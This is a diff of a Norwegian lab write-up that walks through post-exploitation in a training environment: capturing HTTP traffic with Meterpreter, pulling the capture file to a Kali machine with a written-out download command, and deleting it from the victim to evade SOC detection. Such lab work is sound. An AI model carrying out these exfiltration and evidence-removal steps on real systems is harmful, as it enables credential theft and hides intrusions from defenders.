@@ -30,11 +30,30 @@ Denne kommandoen vil lagre nettverkstrafikken vi tar opp i en etl-fil på et van
 Nå som nettverkstrafikken blir tatt opp kan vi starte på Del C av oppgaven. <img width="940" height="241" alt="image" src="https://github.com/user-attachments/assets/67652d75-a428-4ea0-90e3-35c083971654" />
 
 ## DEL C 
-Nå starter vi opp den sårbare VM'en og kobler oss til webserveren med Internet Explorer på Windows-maskinen:<img width="811" height="415" alt="image" src="https://github.com/user-attachments/assets/d593755b-9017-45cc-96b3-30be780e713d" />
+
+Nå starter vi opp den sårbare VM'en og kobler oss til webserveren med Internet Explorer på Windows-maskinen:<img width="582" height="296" alt="image" src="https://github.com/user-attachments/assets/573bfd4b-3d7d-4523-afd0-f145b539cad3" />
 
 
+<img width="322" height="261" alt="image" src="https://github.com/user-attachments/assets/5bdd443a-2d39-4121-a11c-b1099d1c0c8a" />
+Vi skal nå logge inn med brukernavnet og passordet til en bruker med managerrolle. Login info ble funnet i en tidligere labøvelse
+<img width="668" height="280" alt="image" src="https://github.com/user-attachments/assets/312fd228-7e87-409c-8ef7-76ca54e76a4d" />
 
-<img width="459" height="366" alt="image" src="https://github.com/user-attachments/assets/ee6796be-1fe5-4dd4-bb92-dfb9eed5f4b0" />   <img width="360" height="200" alt="image" src="https://github.com/user-attachments/assets/821c9bae-293f-4fb8-b300-42b8f1f067a4" />
+
+Nå som vi har logget inn, ser vi at denne brukeren har Manager-rolle som nevnt i oppgaven. Webapplikasjonen tar i bruk HTTP protokoll, noe som gjør at nettverkstrafikken ikke er kryptert og lesbar. Dette gjør det mulig for oss å se påloggingsinformasjonen når vi senere skal analysere nettverkstrafikken på Wireshark.
+
+Nå skal vi tilbake til Metasploit og stoppe packet capture. Etter avlsuttet operasjon ser vi at filen er lagret som «ntwrkcap.etl» i «c:\windows\temp» filstien <img width="738" height="149" alt="image" src="https://github.com/user-attachments/assets/ff0e09d9-f958-4282-b24e-0b544933b371" />
+
+## DEL D
+
+For å gå tilbake til meterpreter-prompten skriver vi «exit» slik som dette: <img width="275" height="96" alt="image" src="https://github.com/user-attachments/assets/1162d491-15ae-4957-8986-851aee191516" />
+
+Vi laster ned nettverkstrafikk-filen fra filbanen den ligger i og over til kali maskinen vår med følgende kommando: «download c:\\windows\\temp\\ntwrkcap.etl /home/kali».
+
+
+Imotsetning til vanlig input på windows, må vi legge til en ekstra «\» på meterpreter: <img width="940" height="116" alt="image" src="https://github.com/user-attachments/assets/b6ab9445-2850-42d3-a4b8-89646c124518" />
+For å sørge for å unngå SOC-deteksjon, sletter vi filen fra offermaskinen før vi gjør oss ferdig med dette steget. Vi gjør dette med følgende kommando:
+
+<img width="696" height="300" alt="image" src="https://github.com/user-attachments/assets/c55b0e83-f57b-476f-b229-ae1d88b2ef7f" />
 
 
 
